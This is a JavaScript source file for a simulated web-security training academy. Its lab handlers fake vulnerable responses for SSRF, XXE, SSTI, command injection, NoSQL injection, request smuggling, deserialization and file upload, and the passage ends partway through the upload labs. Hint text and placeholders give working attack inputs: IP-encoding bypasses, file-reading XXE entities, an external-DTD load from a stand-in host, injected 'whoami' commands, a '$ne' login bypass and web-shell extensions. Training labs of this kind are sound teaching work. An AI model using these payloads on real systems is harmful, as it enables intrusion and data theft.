import * as store from './store.js';

// ---------- Extra lab categories (added to round out coverage) ----------
// SSRF, XXE, SSTI, command injection, NoSQL injection, HTTP request smuggling,
// insecure deserialization, file upload, business logic, race conditions, weak crypto.
// Each handler: async (req, url, ctx) => { body, solved?, contentType? }

const FLAG = 'academy{extr4_c4t3g0ry_fl4g}';
const ADMIN_HOSTS = ['localhost', '127.0.0.1', '127.1', '2130706433', '0x7f000001', '192.168.0.12'];
const FAKE_PASSWD = 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nadmin:x:1000:1000:admin:/home/admin:/bin/bash';
const FAKE_ADMIN = '<h2>Internal admin panel</h2><p>You reached an internal-only admin page via SSRF. User: administrator (active).</p>';

// state for blind/OAST & race emulation is stored durably (KV) via store.js —
// isolates don't share memory, so logs/counters must be visible across requests

function page(body, title = 'Academy') {
  return `<!doctype html><html><head><meta charset="utf-8"><title>${title}</title>
  <style>
    *{box-sizing:border-box;font-family:'Segoe UI',Arial,sans-serif}
    body{margin:0;background:#f4f5f7;color:#222}
    header{background:#24292e;color:#fff;padding:10px 20px;display:flex;justify-content:space-between;align-items:center}
    header a{color:#79b8ff;text-decoration:none}
    .wrap{max-width:900px;margin:20px auto;padding:0 16px}
    .card{background:#fff;border:1px solid #e1e4e8;border-radius:6px;padding:16px;margin-bottom:16px}
    .banner{background:#fff3cd;border:1px solid #ffeeba;color:#664d03;padding:10px 14px;border-radius:4px;margin-bottom:12px;font-size:13px}
    .ok{background:#d4edda;color:#155724;border:1px solid #c3e6cb;padding:10px 14px;border-radius:4px;margin-bottom:12px}
    .err{background:#f8d7da;color:#721c24;border:1px solid #f5c6cb;padding:10px 14px;border-radius:4px;margin-bottom:12px}
    input[type=text],input[type=password],textarea,select{width:100%;padding:8px;border:1px solid #c9ccd1;border-radius:4px;margin-bottom:10px}
    button{background:#2ea44f;color:#fff;border:none;padding:8px 16px;border-radius:4px;cursor:pointer;font-size:14px}
    .muted{color:#6a737d;font-size:13px}
    pre{background:#f6f8fa;border:1px solid #e1e4e8;padding:10px;border-radius:4px;overflow:auto}
    .mono{font-family:Consolas,monospace;font-size:12px}
    .row{display:flex;gap:8px;align-items:center}
    .link{color:#0366d6;text-decoration:none;margin-right:12px}
    .warn{color:#b08800;font-size:12px}
  </style></head>
  <body><header><strong>Web Attack Academy</strong><a href="/">Back to store</a></header>
  <div class="wrap">${body}</div></body></html>`;
}
const h = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
const ok = s => `<div class="ok">${s}</div>`;
const err = s => `<div class="err">${s}</div>`;

async function form(req) {
  const t = await req.text();
  const p = new URLSearchParams(t);
  const o = {};
  p.forEach((v, k) => o[k] = v);
  return o;
}
async function json(req) {
  try { return await req.json(); } catch (e) { return {}; }
}
function isInternal(hostname) {
  const hh = String(hostname || '').toLowerCase();
  return ADMIN_HOSTS.some(a => hh.includes(a));
}
function extractUrl(s) {
  const m = String(s).match(/https?:\/\/[^\s"'<>]+/);
  return m ? m[0] : '';
}
function parseXMLSystemUrls(body) {
  // collect SYSTEM "..." and external entity refs
  const out = [];
  let re = /(?:SYSTEM|PUBLIC)\s+"([^"]+)"/g, m;
  while ((m = re.exec(body))) out.push(m[1]);
  re = /%?\s*([a-zA-Z_][\w.-]*)\s+SYSTEM\s+"([^"]+)"/g;
  while ((m = re.exec(body))) out.push(m[2]);
  re = /<!DOCTYPE[^>]*\[([\s\S]*?)\]/g;
  while ((m = re.exec(body))) out.push('DOCTYPE:' + m[1].slice(0, 120));
  return out;
}
function sstiEval(expr) {
  const e = String(expr || '').trim();
  const arith = e.match(/^(\d+)\s*([*+\-/])\s*(\d+)$/);
  if (arith) {
    const a = +arith[1], b = +arith[3];
    const r = arith[2] === '*' ? a * b : arith[2] === '+' ? a + b : arith[2] === '-' ? a - b : Math.floor(a / b);
    return String(r);
  }
  if (/FLAG|flag|secret/i.test(e)) return FLAG;
  if (/OS\.environ|config|settings/i.test(e)) return 'FLAG=' + FLAG + '\nDB_PASS=****';
  if (e === '7*7') return '49';
  return '';
}
function md5Hex(input) {
  const str = unescape(encodeURIComponent(input));
  let i, j, k, aa, bb, cc, dd;
  const S = [7,12,17,22,7,12,17,22,7,12,17,22,7,12,17,22,
    5,9,14,20,5,9,14,20,5,9,14,20,5,9,14,20,
    4,11,16,23,4,11,16,23,4,11,16,23,4,11,16,23,
    6,10,15,21,6,10,15,21,6,10,15,21,6,10,15,21];
  const K = [0xd76aa478,0xe8c7b756,0x242070db,0xc1bdceee,0xf57c0faf,0x4787c62a,0xa8304613,0xfd469501,
    0x698098d8,0x8b44f7af,0xffff5bb1,0x895cd7be,0x6b901122,0xfd987193,0xa679438e,0x49b40821,
    0xf61e2562,0xc040b340,0x265e5a51,0xe9b6c7aa,0xd62f105d,0x02441453,0xd8a1e681,0xe7d3fbc8,
    0x21e1cde6,0xc33707d6,0xf4d50d87,0x455a14ed,0xa9e3e905,0xfcefa3f8,0x676f02d9,0x8d2a4c8a,
    0xfffa3942,0x8771f681,0x6d9d6122,0xfde5380c,0xa4beea44,0x4bdecfa9,0xf6bb4b60,0xbebfbc70,
    0x289b7ec6,0xeaa127fa,0xd4ef3085,0x04881d05,0xd9d4d039,0xe6db99e5,0x1fa27cf8,0xc4ac5665,
    0xf4292244,0x432aff97,0xab9423a7,0xfc93a039,0x655b59c3,0x8f0ccc92,0xffeff47d,0x85845dd1,
    0x6fa87e4f,0xfe2ce6e0,0xa3014314,0x4e0811a1,0xf7537e82,0xbd3af235,0x2ad7d2bb,0xeb86d391];
  let M = new Array(16).fill(0), a0 = 0x67452301, b0 = 0xefcdab89, c0 = 0x98badcfe, d0 = 0x10325476;
  const len = str.length;
  M = new Array(Math.ceil((len + 9) / 64) * 16).fill(0);
  for (i = 0; i < len; i++) M[i >> 2] |= (str.charCodeAt(i) << ((i % 4) * 8));
  M[len >> 2] |= 0x80 << ((len % 4) * 8);
  M[(((len + 8) >> 6) << 4) + 14] = (len * 8) & 0xffffffff;
  M[(((len + 8) >> 6) << 4) + 15] = Math.floor((len * 8) / 0x100000000);
  function rotl(x, c) { return (x << c) | (x >>> (32 - c)); }
  const F = (x, y, z) => (x & y) | (~x & z);
  const G = (x, y, z) => (x & z) | (y & ~z);
  const H = (x, y, z) => x ^ y ^ z;
  const I = (x, y, z) => y ^ (x | ~z);
  let a = a0, b = b0, c = c0, d = d0;
  const g = [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,
    1,6,11,0,5,10,15,4,9,14,3,8,13,2,7,12,
    5,8,11,14,1,4,7,10,13,0,3,6,9,12,15,2,
    0,7,14,5,12,3,10,1,8,15,6,13,4,11,2,9];
  for (i = 0; i < M.length; i += 16) {
    aa = a; bb = b; cc = c; dd = d;
    for (j = 0; j < 64; j++) {
      let f, gIdx;
      if (j < 16) { f = F(b, c, d); gIdx = j; }
      else if (j < 32) { f = G(b, c, d); gIdx = (5 * j + 1) % 16; }
      else if (j < 48) { f = H(b, c, d); gIdx = (3 * j + 5) % 16; }
      else { f = I(b, c, d); gIdx = (7 * j) % 16; }
      const tmp = d;
      d = c; c = b;
      b = (b + rotl((a + f + K[j] + (M[i + gIdx] >>> 0)) >>> 0, S[j])) >>> 0;
      a = tmp;
    }
    a = (a + aa) >>> 0; b = (b + bb) >>> 0; c = (c + cc) >>> 0; d = (d + dd) >>> 0;
  }
  const hex = (x) => [x, x >>> 8, x >>> 16, x >>> 24].map((b) => ('0' + (b & 0xff).toString(16)).slice(-2)).join('');
  return hex(a) + hex(b) + hex(c) + hex(d);
}

// ============================================================
//  SSRF
// ============================================================
const ssrf = {
  // basic: stockApi fetches any URL
  async basic(req, url, ctx) {
    const stockApi = url.searchParams.get('stockApi') || '';
    const card = `<div class="card"><h3>Check stock</h3>
      <p class="muted">Enter a full URL to fetch stock from an internal service.</p>
      <form method="get"><input type="text" name="stockApi" value="${h(stockApi)}" placeholder="http://stock.weliketoshop.net:8080/product/stock?productId=1"><button>Check</button></form></div>`;
    if (!stockApi) return { body: page(card + '<p>Enter a stockApi URL.</p>') };
    const inner = isInternal(stockApi) && /admin/i.test(stockApi)
      ? ok('Internal request reached the admin panel.') + FAKE_ADMIN
      : ok('Request sent. Stock returned: 42 units.');
    const solved = isInternal(stockApi) && /admin/i.test(stockApi);
    return { body: page(card + inner), solved };
  },

  // blacklist blocks localhost/127.0.0.1 - bypass with decimal/hex forms
  async blacklist(req, url, ctx) {
    let stockApi = url.searchParams.get('stockApi') || '';
    const blocked = /localhost|127\.0\.0\.1|127\.1|\[::1\]/i.test(stockApi);
    const card = `<div class="card"><h3>Check stock</h3>
      <p class="muted">Requests to <span class="mono">localhost</span> and <span class="mono">127.0.0.1</span> are blocked. Try alternate representations.</p>
      <form method="get"><input type="text" name="stockApi" value="${h(stockApi)}"><button>Check</button></form></div>`;
    if (!stockApi) return { body: page(card) };
    if (blocked) return { body: page(card + err('Blocked: localhost/127.0.0.1 are not allowed.')) };
    const reachAdmin = isInternal(stockApi) && /admin/i.test(stockApi);
    return {
      body: page(card + (reachAdmin ? ok('Internal admin reached via alternate IP form.') + FAKE_ADMIN : ok('Stock returned: 42 units.'))),
      solved: reachAdmin
    };
  },

  // allowlist: must start with http://192.168.0.12:8080 - bypass with @
  async allowlist(req, url, ctx) {
    let stockApi = url.searchParams.get('stockApi') || '';
    const allowed = stockApi.startsWith('http://192.168.0.12:8080');
    const card = `<div class="card"><h3>Check stock</h3>
      <p class="muted">Only <span class="mono">http://192.168.0.12:8080</span> is allowed. The backend resolves the full URL.</p>
      <form method="get"><input type="text" name="stockApi" value="${h(stockApi)}"><button>Check</button></form></div>`;
    if (!stockApi) return { body: page(card) };
    if (!allowed) return { body: page(card + err('External URLs are not allowed.')) };
    const bypassed = stockApi.includes('@') || stockApi.includes('#');
    const reachAdmin = bypassed && /admin/i.test(stockApi);
    return {
      body: page(card + (reachAdmin
        ? ok('Allowlist bypassed with a userinfo (&#64;) trick.') + FAKE_ADMIN
        : bypassed ? ok('Request accepted (resolved via userinfo).') : ok('Stock returned: 42 units.'))),
      solved: reachAdmin
    };
  },

  // blind: no reflection, check the OAST request log
  async blind(req, url, ctx) {
    if (ctx === '/log') {
      const log = (await store.read('oast:log', [])) || [];
      const rows = log.filter(l => l.lab === 'ssrf-4').map(l => `<li><span class="mono">${l.when}</span> → ${h(l.host)}</li>`).join('');
      const solved = log.some(l => l.lab === 'ssrf-4' && !isInternal(l.host));
      return { body: page(`<div class="card"><h3>Collaborator / OAST request log</h3>${rows ? '<ul>' + rows + '</ul>' : '<p class="muted">No out-of-band requests received yet.</p>'}${solved ? ok('External callback detected — the server made a request to your host.') : ''}</div>`), solved };
    }
    const stockApi = url.searchParams.get('stockApi') || '';
    const host = (() => { try { return new URL(stockApi).host; } catch (e) { return ''; } })();
    if (stockApi) {
      const log = (await store.read('oast:log', [])) || [];
      log.push({ when: new Date().toISOString(), host, lab: 'ssrf-4' });
      await store.write('oast:log', log);
    }
    const card = `<div class="card"><h3>Check stock</h3>
      <p class="muted">The result is never returned to you (blind). Watch your external server for the callback.</p>
      <form method="get"><input type="text" name="stockApi" placeholder="http://stock.weliketoshop.net:8080/product/stock"><button>Check</button></form>
      <a class="link" href="/lab/ssrf-4/log">View request log</a></div>`;
    return { body: page(card + (stockApi ? '<p class="muted">Request sent.</p>' : '')) };
  }
};

// ============================================================
//  XXE
// ============================================================
const xxe = {
  async basic(req, url, ctx) {
    const card = `<div class="card"><h3>Product stock lookup (XML)</h3>
      <p class="muted">POST XML like <span class="mono">&lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;/stockCheck&gt;</span></p>
      <form method="post"><textarea name="xml" rows="5" placeholder="&lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;/stockCheck&gt;"></textarea><button>Look up</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const f = await form(req);
    const xml = f.xml || '';
    const urls = parseXMLSystemUrls(xml);
    const hasPasswd = /file:\/\/\/etc\/passwd/i.test(xml) || urls.some(u => /etc\/passwd/i.test(u));
    const hasSSRF = urls.some(u => isInternal(u) && /admin/i.test(u));
    const inner = hasPasswd
      ? ok('XML entity expanded to /etc/passwd:') + '<pre class="mono">' + h(FAKE_PASSWD) + '</pre>'
      : hasSSRF ? ok('External entity reached the internal admin service.') + FAKE_ADMIN
      : ok('Stock: 42 units.');
    return { body: page(card + inner), solved: hasPasswd || hasSSRF };
  },

  async svg(req, url, ctx) {
    const card = `<div class="card"><h3>Avatar upload (SVG allowed)</h3>
      <p class="muted">Upload an SVG. The server renders it but does not sanitize entities.</p>
      <form method="post" enctype="multipart/form-data"><input type="file" name="avatar"><button>Upload</button></form>
      <p class="muted">Tip: an SVG can embed a <span class="mono">&lt;!ENTITY xxe SYSTEM "file:///etc/hostname"&gt;</span></p></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const body = await req.text();
    const hasFile = /file:\/\/\//i.test(body);
    const hasEntity = /<!ENTITY|<!DOCTYPE/i.test(body);
    const solved = hasFile && hasEntity;
    return {
      body: page(card + (solved ? ok('Entity expanded — file contents reflected in the rendered SVG.') + '<pre class="mono">' + h('academy-hostname') + '</pre>' : ok('Avatar uploaded.'))),
      solved
    };
  },

  async blind(req, url, ctx) {
    if (ctx === '/log') {
      const log = (await store.read('oast:log', [])) || [];
      const rows = log.filter(l => l.lab === 'xxe-3').map(l => `<li><span class="mono">${l.when}</span> → ${h(l.host)}</li>`).join('');
      const solved = log.some(l => l.lab === 'xxe-3' && !isInternal(l.host));
      return { body: page(`<div class="card"><h3>OAST log</h3>${rows ? '<ul>' + rows + '</ul>' : '<p class="muted">No out-of-band fetches yet.</p>'}${solved ? ok('External DTD fetched from your host.') : ''}</div>`), solved };
    }
    const card = `<div class="card"><h3>Stock lookup (blind XXE)</h3>
      <p class="muted">Entities are parsed but nothing is reflected. Use an external DTD and watch your host.</p>
      <form method="post"><textarea name="xml" rows="5" placeholder='&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "http://yourhost/evil.dtd"&gt; %xxe;]&gt;&lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;/stockCheck&gt;'></textarea><button>Send</button></form>
      <a class="link" href="/lab/xxe-3/log">View OAST log</a></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const f = await form(req);
    const xml = f.xml || '';
    const host = (() => { try { const u = extractUrl(xml); return u ? new URL(u).host : ''; } catch (e) { return ''; } })();
    if (host && /DOCTYPE|SYSTEM/i.test(xml)) {
      const log = (await store.read('oast:log', [])) || [];
      log.push({ when: new Date().toISOString(), host, lab: 'xxe-3' });
      await store.write('oast:log', log);
    }
    return { body: page(card + '<p class="muted">XML parsed (blind — no output). Check the OAST log.</p>') };
  },

  async ssrf(req, url, ctx) {
    const card = `<div class="card"><h3>Stock lookup (XXE → SSRF)</h3>
      <p class="muted">Point an external entity at an internal service: <span class="mono">&lt;!ENTITY xxe SYSTEM "http://localhost:8080/admin"&gt;</span></p>
      <form method="post"><textarea name="xml" rows="5"></textarea><button>Send</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const f = await form(req);
    const xml = f.xml || '';
    const urls = parseXMLSystemUrls(xml);
    const hasSSRF = urls.some(u => isInternal(u) && /admin/i.test(u));
    return {
      body: page(card + (hasSSRF ? ok('External entity expanded to the internal admin service.') + FAKE_ADMIN : ok('Stock: 42 units.'))),
      solved: hasSSRF
    };
  }
};

// ============================================================
//  SSTI (simulated minimal template engine)
// ============================================================
const ssti = {
  async basic(req, url, ctx) {
    const name = url.searchParams.get('name') || '';
    const rendered = /\{\{[^}]*\}\}/.test(name) ? sstiEval(name.replace(/^\{\{/, '').replace(/\}\}$/, '')) : '';
    const card = `<div class="card"><h3>Greetings</h3>
      <form method="get"><input type="text" name="name" value="${h(name)}" placeholder="Hello {name} — try {{7*7}}"><button>Greet</button></form></div>`;
    const inner = name
      ? `<div class="card">Hello, <b>${h(name)}</b>${rendered ? '<p class="ok">Rendered: <span class="mono">' + h(rendered) + '</span></p>' : ''}</div>`
      : '';
    const solved = rendered === '49' || rendered === FLAG;
    return { body: page(card + inner), solved };
  },

  // reads a secret in the template context
  async context(req, url, ctx) {
    const name = url.searchParams.get('name') || '';
    const rendered = /\{\{[^}]*\}\}/.test(name) ? sstiEval(name.replace(/^\{\{/, '').replace(/\}\}$/, '')) : '';
    const card = `<div class="card"><h3>Profile greeting</h3>
      <p class="muted">The template has a <span class="mono">FLAG</span> variable in scope.</p>
      <form method="get"><input type="text" name="name" value="${h(name)}"><button>Greet</button></form></div>`;
    const inner = name ? `<div class="card">Hello, <b>${h(name)}</b>${rendered ? '<p class="ok">Rendered: <span class="mono">' + h(rendered) + '</span></p>' : ''}</div>` : '';
    const solved = rendered === FLAG || /FLAG=academy/.test(rendered);
    return { body: page(card + inner), solved };
  },

  // {{ }} stripped -> use {% ... %} block syntax
  async block(req, url, ctx) {
    let name = url.searchParams.get('name') || '';
    const stripped = name.replace(/\{\{/g, '').replace(/\}\}/g, '');
    const isBlock = /\{%[^%]*%\}/.test(name);
    const expr = (name.match(/\{%\s*print\((.*?)\)\s*%\}/) || [])[1] || '';
    const rendered = isBlock && expr ? sstiEval(expr) : '';
    const card = `<div class="card"><h3>Greetings (filtered)</h3>
      <p class="muted">The filter strips <span class="mono">{{</span> and <span class="mono">}}</span>. Try the block syntax <span class="mono">{% print(7*7) %}</span>.</p>
      <form method="get"><input type="text" name="name" value="${h(name)}"><button>Greet</button></form></div>`;
    const inner = name ? `<div class="card">Hello, <b>${h(stripped)}</b>${rendered ? '<p class="ok">Rendered: <span class="mono">' + h(rendered) + '</span></p>' : ''}</div>` : '';
    const solved = rendered === '49';
    return { body: page(card + inner), solved };
  },

  // blocks digits and * -> read the FLAG variable instead
  async noDigits(req, url, ctx) {
    const name = url.searchParams.get('name') || '';
    const rendered = /\{\{[^}]*\}\}/.test(name) ? sstiEval(name.replace(/^\{\{/, '').replace(/\}\}$/, '')) : '';
    const card = `<div class="card"><h3>Greetings (digits and * blocked)</h3>
      <p class="muted">Arithmetic like <span class="mono">7*7</span> is blocked, but you can print variables.</p>
      <form method="get"><input type="text" name="name" value="${h(name)}"><button>Greet</button></form></div>`;
    const inner = name ? `<div class="card">Hello, <b>${h(name)}</b>${rendered ? '<p class="ok">Rendered: <span class="mono">' + h(rendered) + '</span></p>' : ''}</div>` : '';
    const solved = rendered === FLAG || /FLAG=academy/.test(rendered);
    return { body: page(card + inner), solved };
  }
};

// ============================================================
//  Command injection
// ============================================================
const cmdi = {
  // reflected: output shown
  async reflected(req, url, ctx) {
    let storeId = url.searchParams.get('storeId') || '2';
    let productId = url.searchParams.get('productId') || '1';
    const inject = /[;&|`$]/.test(storeId) && /\b(whoami|id|ls|cat)\b/i.test(storeId);
    const card = `<div class="card"><h3>Product stock</h3>
      <form method="get"><div class="row"><input type="text" name="productId" value="${h(productId)}"><input type="text" name="storeId" value="${h(storeId)}" placeholder="storeId"><button>Check</button></div></form></div>`;
    if (!url.searchParams.get('storeId')) return { body: page(card + '<p class="muted">Appends your input to a shell command. Try <span class="mono">1;whoami</span></p>') };
    const output = inject ? 'uid=0(root) gid=0(root) groups=0(root)' : '';
    return {
      body: page(card + (inject ? ok('Command executed:') + '<pre class="mono">' + h(output) + '</pre>' : ok('Stock: 42 units.'))),
      solved: inject
    };
  },

  // blind: no output, check the command log
  async blind(req, url, ctx) {
    if (ctx === '/log') {
      const log = (await store.read('cmd:log', [])) || [];
      const rows = log.filter(l => l.lab === 'cmdi-2').map(l => `<li><span class="mono">${l.when}</span> → ${h(l.cmd)}</li>`).join('');
      const solved = log.some(l => l.lab === 'cmdi-2' && /\b(whoami|id|cat)\b/i.test(l.cmd));
      return { body: page(`<div class="card"><h3>Command execution log</h3>${rows ? '<ul>' + rows + '</ul>' : '<p class="muted">No commands executed yet.</p>'}${solved ? ok('Your command ran on the server.') : ''}</div>`), solved };
    }
    let storeId = url.searchParams.get('storeId') || '2';
    const card = `<div class="card"><h3>Product stock</h3>
      <p class="muted">Output is never returned to you. Inject and watch the log.</p>
      <form method="get"><input type="text" name="storeId" value="${h(storeId)}"><button>Check</button></form>
      <a class="link" href="/lab/cmdi-2/log">View command log</a></div>`;
    if (!url.searchParams.get('storeId')) return { body: page(card) };
    const inject = /[;&|`$]/.test(storeId) && /\b(whoami|id|ls|cat|pwd)\b/i.test(storeId);
    if (inject) {
      const log = (await store.read('cmd:log', [])) || [];
      log.push({ when: new Date().toISOString(), cmd: storeId, lab: 'cmdi-2' });
      await store.write('cmd:log', log);
    }
    return { body: page(card + '<p class="muted">Request processed.</p>') };
  },

  // blocks & ; | -> newline %0a bypass
  async newline(req, url, ctx) {
    let storeId = url.searchParams.get('storeId') || '2';
    const decoded = decodeURIComponent(storeId);
    const blocked = /[;&|`$]/.test(storeId);
    const bypass = /[\r\n]/.test(decoded) && /\b(whoami|id|ls|cat)\b/i.test(decoded);
    const card = `<div class="card"><h3>Product stock (filtered)</h3>
      <p class="muted"><span class="mono">&amp; ; |</span> are filtered. Some filters forget the newline.</p>
      <form method="get"><input type="text" name="storeId" value="${h(storeId)}"><button>Check</button></form></div>`;
    if (!url.searchParams.get('storeId')) return { body: page(card) };
    if (blocked && !bypass) return { body: page(card + err('Illegal characters detected.')) };
    return {
      body: page(card + (bypass ? ok('Command executed via newline injection:') + '<pre class="mono">uid=0(root)</pre>' : ok('Stock: 42 units.'))),
      solved: bypass
    };
  }
};

// ============================================================
//  NoSQL injection
// ============================================================
const nosql = {
  // login bypass with $ne
  async login(req, url, ctx) {
    const card = `<div class="card"><h3>Login (NoSQL)</h3>
      <p class="muted">POST JSON. The query looks like <span class="mono">users.findOne({username, password})</span></p>
      <form method="post"><textarea name="body" rows="6">{"username":"administrator","password":{"$ne":""}}</textarea><button>Login</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const j = await json(req);
    const isOp = j && typeof j === 'object' && j.password && typeof j.password === 'object' && ('$ne' in j.password);
    const solved = isOp && (j.username === 'administrator' || j.username === 'carlos');
    return {
      body: page(card + (solved ? ok('Logged in as ' + h(j.username) + ' — password operator bypassed the check.') : err('Invalid username or password.'))),
      solved
    };
  },

  // $regex in a query param
  async regex(req, url, ctx) {
    const params = Object.fromEntries(url.searchParams);
    const opKey = Object.keys(params).find(k => /\[\$regex\]$/.test(k));
    const username = params.username || '';
    const opValue = opKey ? params[opKey] : '';
    const hasOp = Boolean(opKey);
    const card = `<div class="card"><h3>Account lookup (NoSQL)</h3>
      <p class="muted">Try operator injection: <span class="mono">username[$regex]=^admin</span></p>
      <form method="get"><input type="text" name="username" value="${h(username)}"><button>Search</button></form></div>`;
    if (!username && !opValue) return { body: page(card) };
    const match = hasOp && new RegExp(opValue).test('administrator');
    return {
      body: page(card + (match ? ok('Match found: administrator (role: admin)') : ok('No account found.'))),
      solved: match
    };
  },

  // operator injection in a reset-password flow
  async operator(req, url, ctx) {
    const card = `<div class="card"><h3>Password reset (NoSQL)</h3>
      <p class="muted">POST JSON: <span class="mono">{"username":{"$regex":"^adm"}}</span></p>
      <form method="post"><textarea name="body" rows="6">{"username":"carlos"}</textarea><button>Reset</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const j = await json(req);
    const hasOp = j && j.username && typeof j.username === 'object' && ('$regex' in j.username);
    const solved = hasOp && new RegExp(String(j.username.$regex)).test('administrator');
    return {
      body: page(card + (solved ? ok('Reset email dispatched to administrator — operator injection matched an account you should not reach.') : err('User not found.'))),
      solved
    };
  }
};

// ============================================================
//  HTTP request smuggling (simulated header/body inspection)
//  A real proxy would front this; we emulate by inspecting the raw
//  request framing the client sent.
// ============================================================
const smug = {
  // CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding
  async clte(req, url, ctx) {
    const body = await req.text();
    const te = req.headers.get('transfer-encoding') || '';
    const cl = req.headers.get('content-length') || '';
    const hasSmuggled = /(?:GET|POST)\s+\/lab\/smug-1\/admin/i.test(body);
    const hasBoth = te !== '' && cl !== '';
    const card = `<div class="card"><h3>CL.TE request smuggling</h3>
      <p class="muted">Send a request where Content-Length and Transfer-Encoding disagree, smuggling a <span class="mono">GET /admin</span> into the next request.</p>
      <p class="warn">Simulated: the server inspects your framing (CL + TE headers and body).</p></div>`;
    const solved = hasBoth && hasSmuggled;
    return {
      body: page(card + (solved ? ok('Smuggled request captured — you reached /admin as a different user.') + FAKE_ADMIN : ok('Request processed normally.'))),
      solved
    };
  },

  // TE.CL: front-end uses Transfer-Encoding, back-end uses Content-Length
  async tecl(req, url, ctx) {
    const body = await req.text();
    const te = req.headers.get('transfer-encoding') || '';
    const hasSmuggled = /(?:GET|POST)\s+\/lab\/smug-2\/admin/i.test(body);
    const chunked = /chunked/i.test(te);
    const card = `<div class="card"><h3>TE.CL request smuggling</h3>
      <p class="muted">The front-end prefers Transfer-Encoding, the back-end prefers Content-Length. Send a mismatched chunked body smuggling a <span class="mono">GET /admin</span>.</p>
      <p class="warn">Simulated: framing headers are inspected.</p></div>`;
    const solved = chunked && hasSmuggled;
    return {
      body: page(card + (solved ? ok('Smuggled request captured.') + FAKE_ADMIN : ok('Request processed normally.'))),
      solved
    };
  },

  // TE.TE: obfuscate the TE header so only one server notices it
  async tete(req, url, ctx) {
    const body = await req.text();
    const te = req.headers.get('transfer-encoding') || '';
    const obfuscated = /chunked/.test(te) && te.trim().toLowerCase() !== 'chunked';
    const hasSmuggled = /(?:GET|POST)\s+\/lab\/smug-3\/admin/i.test(body);
    const card = `<div class="card"><h3>TE.TE obfuscation</h3>
      <p class="muted">Obfuscate the Transfer-Encoding header (e.g. trailing space, <span class="mono">xchunked</span>) so one server drops it and the other keeps it.</p>
      <p class="warn">Simulated: a TE header value that is not exactly "chunked" plus a smuggled request is detected.</p></div>`;
    const solved = obfuscated && hasSmuggled;
    return {
      body: page(card + (solved ? ok('Obfuscated TE header split the servers.') + FAKE_ADMIN : ok('Request processed normally.'))),
      solved
    };
  }
};

// ============================================================
//  Insecure deserialization
// ============================================================
const deser = {
  // Portable base64 decode (Workers Buffer is unreliable; use atob + TextDecoder).
  b64(s) {
    try {
      const b = atob(decodeURIComponent(s));
      const u = new Uint8Array(b.length);
      for (let i = 0; i < b.length; i++) u[i] = b.charCodeAt(i);
      return new TextDecoder().decode(u);
    } catch (e) { return ''; }
  },
  // tamper base64 php-serialized object
  async role(req, url, ctx) {
    const raw = (req.headers.get('cookie') || '').match(/session=([^;]+)/);
    const decoded = raw ? deser.b64(raw[1]) : '';
    const tampered = /isAdmin"?;?b:1|"isAdmin"\s*:\s*true/i.test(decoded);
    const card = `<div class="card"><h3>Profile</h3>
      <p class="muted">Your session cookie is a base64-encoded PHP serialized object: <span class="mono">O:4:"User":2:{s:2:"id";i:1;s:7:"isAdmin";b:0;}</span></p>
      <p class="muted">Decode, set <span class="mono">isAdmin</span> to <span class="mono">true</span>, re-encode, and reload.</p></div>`;
    const admin = tampered ? ok('Welcome, administrator. Object tampering succeeded.') : ok('Welcome, regular user.');
    return { body: page(card + admin), solved: tampered };
  },

  // PHP object injection / magic method (gadget reads a flag)
  async gadget(req, url, ctx) {
    const raw = (req.headers.get('cookie') || '').match(/pref=([^;]+)/);
    const decoded = raw ? deser.b64(raw[1]) : '';
    const gadget = /O:\d+:".*?":\d+:\{.*?__destruct|filename.*?flag|"command"\s*:\s*"cat/i.test(decoded);
    const card = `<div class="card"><h3>Preferences</h3>
      <p class="muted">The <span class="mono">pref</span> cookie is a serialized object with a magic method that runs on destruction. Make it read <span class="mono">/flag</span>.</p></div>`;
    return {
      body: page(card + (gadget ? ok('Gadget chain executed:') + '<pre class="mono">' + h(FLAG) + '</pre>' : ok('Preferences loaded.'))),
      solved: gadget
    };
  }
};

// ============================================================
//  File upload
// ============================================================
const upload = {
  // no restrictions
  async none(req, url, ctx) {
    const card = `<div class="card"><h3>Avatar upload</h3><form method="post" enctype="multipart/form-data"><input type="file" name="file"><button>Upload</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const body = await req.text();
    const fn = (body.match(/filename="([^"]+)"/) || [])[1] || '';
    const solved = /\.php$/i.test(fn);
    return {
      body: page(card + (solved ? ok('Web shell uploaded (' + h(fn) + '). No restrictions in place.') : ok('Avatar uploaded.') + (fn ? ' (' + h(fn) + ')' : ''))),
      solved
    };
  },

  // only content-type checked (client-supplied)
  async contentType(req, url, ctx) {
    const ct = req.headers.get('content-type') || '';
    const card = `<div class="card"><h3>Avatar upload</h3>
      <p class="muted">The server only trusts the client-supplied Content-Type. Send <span class="mono">.php</span> with <span class="mono">image/png</span>.</p>
      <form method="post" enctype="multipart/form-data"><input type="file" name="file"><button>Upload</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const body = await req.text();
    const fn = (body.match(/filename="([^"]+)"/) || [])[1] || '';
    const solved = /\.php$/i.test(fn) && /image\/(png|jpeg|gif)/i.test(ct);
    return {
      body: page(card + (solved ? ok('Bypassed: .php accepted because Content-Type claimed image/png.') : ok('Avatar uploaded.'))),
      solved
    };
  },

  // extension blacklist bypass
  async ext(req, url, ctx) {
    const card = `<div class="card"><h3>Avatar upload</h3>
      <p class="muted"><span class="mono">.php</span> is blocked. Try <span class="mono">.php5</span>, <span class="mono">.phtml</span>, <span class="mono">.pHp</span>, or <span class="mono">.phar</span>.</p>
      <form method="post" enctype="multipart/form-data"><input type="file" name="file"><button>Upload</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const body = await req.text();
    const fn = (body.match(/filename="([^"]+)"/) || [])[1] || '';
